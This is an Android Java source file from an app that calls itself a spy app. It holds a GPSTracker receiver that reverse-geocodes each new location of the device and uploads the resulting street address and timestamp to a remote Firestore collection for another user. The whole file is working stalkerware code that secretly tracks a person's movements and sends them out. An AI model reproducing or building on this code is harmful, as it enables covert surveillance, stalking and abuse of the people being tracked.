package com.example.spyapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import com.google.firebase.firestore.FirebaseFirestore;
import java.io.IOException;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class GPSTracker extends BroadcastReceiver {
    private FirebaseFirestore mFirestore;
    String NOTIFICATION_TITLE;
    String NOTIFICATION_MESSAGE;
    String TOPIC;
    Context cont;
    @Override
    public void onReceive(Context context, Intent intent) {
        String key = LocationManager.KEY_LOCATION_CHANGED;
        Location location = (Location) intent.getExtras().get(key);
        cont = context;
        if (location != null) {
            String msg = revGeocode(location);
            TOPIC = "/topics/userABC";
                NOTIFICATION_TITLE = "From Your Spy App (New GPS Location)";
                NOTIFICATION_MESSAGE = msg;
            Map<String, Object> notificationMessage = new HashMap<>();
            notificationMessage.put("datetime", Calendar.getInstance().getTime().toString());
            notificationMessage.put("title", NOTIFICATION_TITLE);
            notificationMessage.put("message", NOTIFICATION_MESSAGE);
            mFirestore = FirebaseFirestore.getInstance();
            mFirestore.collection("Users/userABC/Notifications").add(notificationMessage);

        }
    }

    public String revGeocode(Location location){
        if (location == null) return "";
        double lat = location.getLatitude();
        double lng = location.getLongitude();
        StringBuilder sb = new StringBuilder();
        Geocoder gc = new Geocoder(cont, Locale.getDefault());
        try {
            List<Address> addresses = gc.getFromLocation(lat, lng, 1);
            if (addresses.size() > 0) {
                Address address = addresses.get(0);
                for (int i = 0; i < address.getMaxAddressLineIndex(); i++)
                    sb.append(address.getAddressLine(i)).append("\n");
                sb.append(address.getLocality()).append("\n");
                sb.append(address.getPostalCode()).append("\n");
                sb.append(address.getCountryName());
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return sb.toString();
    }
}